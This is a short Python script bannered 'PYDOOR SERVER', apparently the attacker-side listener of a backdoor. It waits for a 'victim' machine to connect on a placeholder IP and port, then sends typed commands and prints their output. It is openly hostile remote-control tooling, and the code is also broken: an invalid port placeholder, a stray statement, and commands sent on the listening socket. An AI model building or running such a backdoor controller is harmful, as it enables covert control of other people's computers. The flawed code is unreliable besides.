import socket 

print("Starting...")
print("""

██████╗░██╗░░░██╗██████╗░░█████╗░░█████╗░██████╗░
██╔══██╗╚██╗░██╔╝██╔══██╗██╔══██╗██╔══██╗██╔══██╗
██████╔╝░╚████╔╝░██║░░██║██║░░██║██║░░██║██████╔╝
██╔═══╝░░░╚██╔╝░░██║░░██║██║░░██║██║░░██║██╔══██╗
██║░░░░░░░░██║░░░██████╔╝╚█████╔╝╚█████╔╝██║░░██║
╚═╝░░░░░░░░╚═╝░░░╚═════╝░░╚════╝░░╚════╝░╚═╝░░╚═╝

    ▒█▀▀▀█ ▒█▀▀▀ ▒█▀▀█ ▒█░░▒█ ▒█▀▀▀ ▒█▀▀█ 
    ░▀▀▀▄▄ ▒█▀▀▀ ▒█▄▄▀ ░▒█▒█░ ▒█▀▀▀ ▒█▄▄▀ 
    ▒█▄▄▄█ ▒█▄▄▄ ▒█░▒█ ░░▀▄▀░ ▒█▄▄▄ ▒█░▒█
""")

ip = "xxx.xxx.xxx.xxx" #put the ip address
port = xxxxx #put the port without quotation marks

while True:

    sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    address = (ip,port)
    socket.socket
    sock.bind(address)
    sock.listen(1)
    print("Connecting via port " + str(port))
    conn , ipvictim = sock.accept()
    msg = "SERVER CONNECTED"
    conn.send(msg.encode())



    command = input('Command: ')
    command = command.encode()
    sock.send(command)
    print('[+] Command sent')
    output = sock.recv(1024)
    output = output.decode()
    print(f"Output: {output}")
    